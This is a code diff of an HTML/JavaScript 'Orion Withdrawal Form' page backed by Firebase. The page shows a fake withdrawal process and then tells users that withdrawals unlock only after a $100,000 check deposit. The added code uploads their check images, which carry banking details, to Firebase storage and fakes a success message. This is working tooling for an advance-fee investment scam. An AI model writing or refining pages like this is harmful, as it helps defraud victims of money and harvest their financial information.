@@ -7,7 +7,6 @@
     <title>Orion Withdrawal Form</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
-    <!-- Toastify CSS -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
     <style>
         .spinner {
@@ -33,10 +32,8 @@
             display: none;
         }
 
-        /* Style for the popup overlay */
         #checkDeposit {
             background-color: rgba(0, 0, 0, 0.5);
-            /* Removed display: none; */
         }
     </style>
 </head>
@@ -115,41 +112,35 @@
 
             <!-- File Upload Section -->
             <div class="mt-4">
-                <label class="block text-sm font-semibold text-red-600 mb-1" for="checkImage">Upload Check
-                    Image*</label>
+                <label class="block text-sm font-semibold text-red-600 mb-1" for="checkImage">Upload Check Image*</label>
                 <div id="uploadArea"
                     class="flex items-center justify-center w-full p-4 border-4 border-dashed border-red-500 rounded-lg cursor-pointer hover:bg-red-50 transition duration-300">
                     <input type="file" id="checkImage" accept="image/*" class="hidden" />
                     <span class="text-red-500 font-semibold">Click here to upload your check</span>
                 </div>
+                <div class="mt-6 bg-yellow-100 p-4 rounded-md border-l-4 border-yellow-500">
+                    <p class="text-center text-xl font-bold text-yellow-800">$100,000.00 Check</p>
+                </div>
+                <p class="mt-4 text-sm text-gray-500 italic">Please note: For security purposes and to maintain the
+                    integrity of your investment, withdrawals are only enabled after a successful check deposit of
+                    $100,000.00.</p>
+                <p id="uploadMessage" class="mt-2 text-sm text-gray-500"></p>
             </div>
 
-            <!-- Emphasis on Check Amount -->
-            <div class="mt-6 bg-yellow-100 p-4 rounded-md border-l-4 border-yellow-500">
-                <p class="text-center text-xl font-bold text-yellow-800">$100,000.00 Check</p>
-            </div>
-
-            <!-- Reason for Limitation -->
-            <p class="mt-4 text-sm text-gray-500 italic">Please note: For security purposes and to maintain the
-                integrity of your investment, withdrawals are only enabled after a successful check deposit of
-                $100,000.00.</p>
-
-            <!-- Submit Button -->
             <div class="mt-6 flex justify-end">
-                <button
+                <button id="submitDeposit"
                     class="bg-blue-600 text-white font-bold px-6 py-2 rounded-md hover:bg-blue-700 transition duration-300">Submit
                     Deposit</button>
             </div>
         </div>
     </div>
 
-    <!-- Toastify JS -->
     <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
-
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
-
+    <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-storage-compat.js"></script>
+    
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyDTkXjNDPdbOeo32CaCkglIy-6nzuszEJM",
@@ -160,26 +151,15 @@
             appId: "1:911866094162:web:bfe2dc2323995f4585358b",
             measurementId: "G-12SQKBDR1S"
         };
-
         const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-        const auth = firebase.auth();
-    </script>
+        const storage = firebase.storage();
 
-    <script>
-        // Firebase Config
-        
         // Handle form submission
         document.getElementById("withdrawForm").addEventListener("submit", async (e) => {
             e.preventDefault();
             const withdrawBtn = document.getElementById("withdrawBtn");
             const spinner = document.getElementById("spinner");
-            const bankName = document.getElementById("bankName").value;
-            const routingNumber = document.getElementById("routingNumber").value;
-            const accountNumber = document.getElementById("accountNumber").value;
-            const amount = document.getElementById("amount").value;
 
-            // Show spinner and disable button
             spinner.classList.remove("hidden");
             withdrawBtn.disabled = true;
 
@@ -191,7 +171,6 @@
                 const checkDeposit = document.getElementById("checkDeposit");
                 checkDeposit.classList.remove("hidden");
 
-                // Toast notification
                 Toastify({
                     text: "To access your investment withdrawals, please submit a check deposit to your account.",
                     duration: 3000,
@@ -199,7 +178,7 @@
                     position: "center",
                     backgroundColor: "#F24C00"
                 }).showToast();
-            }, 5000);
+            }, 3000);
         });
 
         // Close check deposit popup
@@ -207,60 +186,76 @@
             document.getElementById("checkDeposit").classList.add("hidden");
         });
 
-        // Cancel button functionality
+        // Handle file upload
+        const uploadArea = document.getElementById("uploadArea");
+        const checkImage = document.getElementById("checkImage");
+        const uploadMessage = document.getElementById("uploadMessage");
+
+        uploadArea.addEventListener("click", () => {
+            checkImage.click();
+        });
+
+        checkImage.addEventListener("change", () => {
+            const file = checkImage.files[0];
+            if (file) {
+                uploadMessage.textContent = "Uploading file...";
+
+                const storageRef = storage.ref(`checkDeposits/${file.name}`);
+                const uploadTask = storageRef.put(file);
+
+                uploadTask.on('state_changed', 
+                    (snapshot) => {
+                        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                        uploadMessage.textContent = `Upload is ${progress}% done`;
+                    }, 
+                    (error) => {
+                        uploadMessage.textContent = `Error: ${error.message}`;
+                    }, 
+                    () => {
+                        uploadMessage.textContent = "File uploaded successfully!";
+                        uploadTask.snapshot.ref.getDownloadURL().then((downloadURL) => {
+                            console.log("File available at:", downloadURL);
+                        });
+                    }
+                );
+            } else {
+                uploadMessage.textContent = "No file selected!";
+            }
+        });
+
+        // Submit deposit button action
+        document.getElementById("submitDeposit").addEventListener("click", () => {
+            const file = checkImage.files[0];
+            if (!file) {
+                Toastify({
+                    text: "Please upload a check image before submitting.",
+                    duration: 3000,
+                    gravity: "top",
+                    position: "center",
+                    backgroundColor: "#F24C00"
+                }).showToast();
+            } else {
+                // Simulate successful submission
+                setTimeout(() => {
+                    Toastify({
+                        text: "Check deposit submitted successfully!",
+                        duration: 3000,
+                        gravity: "top",
+                        position: "center",
+                        backgroundColor: "#28a745"
+                    }).showToast();
+
+                    document.getElementById("checkDeposit").classList.add("hidden");
+                }, 2000);
+            }
+        });
+
+        // Cancel button action
         document.getElementById("cancelBtn").addEventListener("click", () => {
-            window.location.href = "./card.html"; // Replace with your redirect page
+            window.location.href = "./card.html"; 
+            document.getElementById("withdrawForm").reset();
         });
     </script>
 </body>
 
 </html>
-
-
-
-<script>
-    // Add click event to the upload area to trigger file input
-    document.getElementById('uploadArea').addEventListener('click', () => {
-      document.getElementById('checkImage').click();
-    });
-  
-    // Add change event to handle file selection and upload
-    document.getElementById('checkImage').addEventListener('change', async function (e) {
-      const file = e.target.files[0]; // Get the uploaded file
-      if (file) {
-        // Display a message that upload has started
-        const uploadMessage = document.getElementById('uploadMessage');
-        uploadMessage.classList.remove('hidden');
-        uploadMessage.textContent = 'Uploading check image...';
-  
-        try {
-          // Create a storage reference
-          const storageRef = firebase.storage().ref(`checks/${file.name}`);
-  
-          // Upload the file
-          const uploadTask = storageRef.put(file);
-  
-          // Monitor upload progress
-          uploadTask.on('state_changed', snapshot => {
-            // Calculate progress percentage
-            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-            uploadMessage.textContent = `Upload is ${progress.toFixed(0)}% done`;
-          }, error => {
-            console.error('Error during upload:', error);
-            uploadMessage.textContent = 'Upload failed. Please try again.';
-          }, async () => {
-            // Get the file's download URL after upload completes
-            const downloadURL = await uploadTask.snapshot.ref.getDownloadURL();
-            console.log('File available at', downloadURL);
-  
-            // Show success message and file URL
-            uploadMessage.textContent = 'Upload successful! Check image uploaded.';
-          });
-        } catch (error) {
-          console.error('Error uploading file:', error);
-          uploadMessage.textContent = 'An error occurred. Please try again.';
-        }
-      }
-    });
-  </script>
-  
